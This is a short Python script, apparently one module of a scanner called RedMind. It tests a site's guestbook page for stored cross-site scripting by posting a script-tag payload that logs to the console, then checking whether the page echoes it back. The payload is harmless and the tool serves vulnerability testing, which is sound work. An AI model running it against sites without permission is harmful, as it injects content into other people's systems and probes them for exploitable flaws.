#!/usr/bin/env python3
import argparse, requests, json, sys
from urllib.parse import urljoin

def run(target):
    url = urljoin(target, "/guestbook.php")
    session = requests.Session()
    session.headers["User-Agent"]="RedMind-XSS-Checker/1.0"
    payload = "<script>console.log(1337)</script>"
    findings=[]
    try:
        # POST payload then GET to verify reflection (some guestbooks redirect)
        session.post(url, data={"name":"RedMind","text":payload,"submit":"submit"}, timeout=10)
        r = session.get(url, timeout=10)
        if payload.lower() in (r.text or "").lower():
            findings.append({"page":url,"payload":payload,"reflected":True})
    except Exception as e:
        findings.append({"error":str(e)})
    return {"module":"rm_mod_003_xss","target":target,"vulnerable":bool([f for f in findings if "reflected" in f]),"findings":findings}

if __name__=="__main__":
    try:
        p=argparse.ArgumentParser(); p.add_argument("--target",required=True); args=p.parse_args()
        print(json.dumps(run(args.target.rstrip("/")), indent=2))
    except Exception as e:
        print(json.dumps({"module":"rm_mod_003_xss","error":str(e)})); sys.exit(1)
